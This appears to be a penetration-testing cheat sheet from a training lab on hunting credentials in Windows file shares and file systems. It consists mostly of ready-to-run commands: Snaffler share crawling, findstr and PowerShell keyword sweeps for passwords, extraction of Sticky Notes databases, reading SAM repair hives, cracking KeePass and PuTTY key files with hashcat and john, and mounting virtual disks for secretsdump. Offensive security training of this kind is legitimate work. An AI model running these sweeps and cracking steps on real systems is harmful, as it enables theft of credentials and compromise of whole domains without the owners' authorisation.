## Other Files for Credential Hunting

File shares and local file systems in Windows environments are frequently goldmines for credentials because users and administrators store sensitive information in documents, notes, and configuration files without considering access controls. A single password found in a share can chain directly to domain compromise. 

***

## Automated Share Enumeration with Snaffler

Snaffler is purpose-built for crawling AD-joined Windows shares at scale, applying file extension and content heuristics to surface high-value targets automatically. 
```bash
# Basic run - discovers domain computers, enumerates shares, finds interesting files
Snaffler.exe -s -o snaffler_output.log

# Specify a domain controller
Snaffler.exe -s -d inlanefreight.local -c DC01 -o snaffler_output.log

# Limit file size to search inside (default 500KB, increase for thorough search)
Snaffler.exe -s -r 2000000 -o snaffler_output.log

# Target a specific host rather than the whole domain
Snaffler.exe -s -t FILE01 -o snaffler_output.log
```

Snaffler colour codes findings: red is highest priority (credentials likely), yellow is interesting, green is informational. 
***

## Manual File System Searching

### Content-Based Searching

```cmd
:: findstr flags: /S = subdirectories, /I = case insensitive, /M = print filename only, /P = skip binary
:: /C = literal string search, /N = print line numbers

:: Search for password keyword - print only filenames
findstr /SIM /C:"password" *.xml *.ini *.txt *.config *.ps1 *.bat *.cmd

:: Search and print the matching line and filename
findstr /si password *.xml *.ini *.txt *.config

:: Recursive across all file types
findstr /spin "password" *.*

:: Multiple keywords at once
findstr /SIMP /C:"password" /C:"passwd" /C:"credential" /C:"secret" /C:"api_key" *.*
```

```powershell
# PowerShell equivalent - better output formatting
Select-String -Path "C:\Users\*\Documents\*.txt" -Pattern "password" -CaseSensitivity Insensitive

# Recursive across all files
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue |
    Select-String -Pattern "password|passwd|credential|secret" -CaseSensitive:$false |
    Select-Object Path, LineNumber, Line

# Search network share
Select-String -Path "\\FILE01\users\*\*.*" -Pattern "password" -ErrorAction SilentlyContinue
```

### Extension-Based Searching

```cmd
:: Search by filename pattern
dir /S /B *pass*.txt *pass*.xml *pass*.ini *cred* *vnc* *.config

:: where command - find files anywhere on drive
where /R C:\ *.config
where /R C:\ *.kdbx
where /R C:\ *.ppk
where /R C:\ *.rdp
where /R C:\ *.ovpn

:: Check for KeePass databases specifically
dir /S /B *.kdbx 2>nul
```

```powershell
# High-value file extensions to hunt for
Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue -Include `
    *.rdp,     # RDP connection files (may contain saved credentials)
    *.kdbx,    # KeePass database
    *.ppk,     # PuTTY private key
    *.pem,     # SSL/TLS private key
    *.key,     # Generic private key
    *.ovpn,    # OpenVPN config (may contain embedded credentials)
    *.vnc,     # VNC config
    *.config,  # Application configs
    *.cred,    # Generic credential files
    *.vmdk,    # VMware virtual disk (mountable for SAM extraction)
    *.vhdx     # Hyper-V virtual disk

# Search network shares from AD context
Get-ChildItem "\\FILE01\users" -Recurse -ErrorAction SilentlyContinue -Include *.kdbx,*.ppk,*.rdp
```

***

## Sticky Notes Database

Sticky Notes stores all note content in a SQLite database, not plaintext files. Users frequently store passwords, PINs, and sensitive data in notes without realising it is not just a local on-screen widget. 
```powershell
# Locate the database
$stickyPath = "C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState"
ls $stickyPath -ErrorAction SilentlyContinue

# Files present: plum.sqlite, plum.sqlite-shm, plum.sqlite-wal
# All three are needed for a complete read
```

### Method A: PSSQLite Module (On Target)

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
Import-Module .\PSSQLite\PSSQLite.psd1

$db = "C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | Format-Table -Wrap

# Also check metadata
Invoke-SqliteQuery -Database $db -Query "SELECT Text, CreatedAt, UpdatedAt FROM Note" | Format-Table -Wrap
```

### Method B: Transfer and Parse on Attack Machine

```bash
# Copy all three SQLite files off target via SMB
# On attack machine, start SMB server or use SCP

# Method 1: strings (fast, no SQLite tools needed)
strings plum.sqlite-wal | grep -i "password\|pass\|login\|secret\|key\|root\|admin"

# Method 2: sqlite3 CLI
sqlite3 plum.sqlite "SELECT Text FROM Note;"

# Method 3: DB Browser for SQLite (GUI)
# Open plum.sqlite -> Browse Data -> Note table -> Text column
```

***

## High-Value Files Reference

```cmd
:: Windows repair folder - old SAM/SYSTEM hives from previous Windows installs
:: Can be used with secretsdump to extract old password hashes
type %WINDIR%\repair\sam
dir %WINDIR%\repair\

:: IIS logs - may contain credentials submitted in GET requests
type %WINDIR%\iis6.log
dir %WINDIR%\system32\logfiles\

:: Windows event log backups
dir %WINDIR%\system32\config\*.Evt

:: Registry hive backups (offline password extraction)
dir %WINDIR%\system32\config\*.sav

:: SCCM/CCM logs - often contain network credentials
dir %WINDIR%\system32\CCM\logs\*.log
findstr /SI /C:"password" %WINDIR%\system32\CCM\logs\*.log

:: NTUSER.DAT - user-specific registry hive (contains saved RDP, recent docs, etc.)
dir %USERPROFILE%\ntuser.dat

:: Hosts file - reveals internal network structure/naming
type %WINDIR%\System32\drivers\etc\hosts

:: PowerShell script directories
dir "C:\Program Files\Windows PowerShell\" /s /b *.ps1
findstr /SIM /C:"password" "C:\Program Files\Windows PowerShell\*"

:: Scheduled tasks - may contain hardcoded credentials
dir C:\Windows\System32\Tasks\
findstr /SIM /C:"password" C:\Windows\System32\Tasks\*
```

***

## Special File Types - Extraction and Use

### KeePass Database (.kdbx)

```bash
# Extract master password hash for cracking
keepass2john database.kdbx > keepass.hash
hashcat -a 0 -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt

# If master password found, open locally with KeePass or use kpcli
kpcli --kdb=database.kdbx
kpcli:/> ls
kpcli:/> cd Passwords/
kpcli:/> show -f 0      # Show entry 0 including password field
```

### PuTTY Private Key (.ppk)

```bash
# Convert PPK to OpenSSH format for use with ssh
puttygen key.ppk -O private-openssh -o id_rsa
chmod 600 id_rsa
ssh -i id_rsa user@target

# If PPK is passphrase protected, crack with john
putty2john key.ppk > ppk.hash
john ppk.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### Virtual Disk Files (.vmdk / .vhdx)

```bash
# Mount VMDK on Linux to extract SAM/SYSTEM
sudo apt install libguestfs-tools
guestmount -a disk.vmdk -i --ro /mnt/vmdk
ls /mnt/vmdk/Windows/System32/config/

# Extract hashes
impacket-secretsdump -sam /mnt/vmdk/Windows/System32/config/SAM \
    -system /mnt/vmdk/Windows/System32/config/SYSTEM local

# Mount VHDX on Windows (PowerShell)
Mount-VHD -Path "C:\path\to\disk.vhdx" -ReadOnly
# Then access via assigned drive letter
```

### Alternate Data Streams

```cmd
:: Files can hide data in ADS - findstr and dir won't show it by default
dir /R C:\interesting_folder\
:: Look for: filename.txt:hidden_stream:$DATA

:: Read an ADS
more < somefile.txt:hidden_stream
```

***

## Credential File Hunting Master Checklist

```powershell
# Run all at once as a quick sweep
$keywords = "password|passwd|credential|secret|api_key|token|username"

# 1. Common file extensions recursively from root
Get-ChildItem C:\ -Recurse -Include *.txt,*.ini,*.cfg,*.config,*.xml,*.ps1,*.bat -ErrorAction SilentlyContinue |
    Select-String -Pattern $keywords -CaseSensitive:$false |
    Select-Object Path, LineNumber, Line | Export-Csv C:\Windows\Temp\cred_hits.csv

# 2. High-value file extensions
Get-ChildItem C:\ -Recurse -Include *.kdbx,*.ppk,*.rdp,*.ovpn,*.pem -ErrorAction SilentlyContinue |
    Select-Object FullName, LastWriteTime, Length

# 3. Sticky Notes
foreach ($userDir in (ls C:\Users).FullName) {
    $db = "$userDir\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
    if (Test-Path $db) { Write-Host "[+] Sticky Notes DB found for $userDir" }
}

# 4. Repair folder hives
if (Test-Path "$env:WINDIR\repair\sam") { Write-Host "[+] SAM repair file present" }

# 5. Unattend files
"C:\Windows\Panther\Unattend.xml","C:\Windows\Panther\Unattend\Unattend.xml",
"C:\Windows\system32\sysprep.inf","C:\Windows\system32\sysprep\sysprep.xml" |
    Where-Object {Test-Path $_} | ForEach-Object { Write-Host "[+] Found: $_" }
```
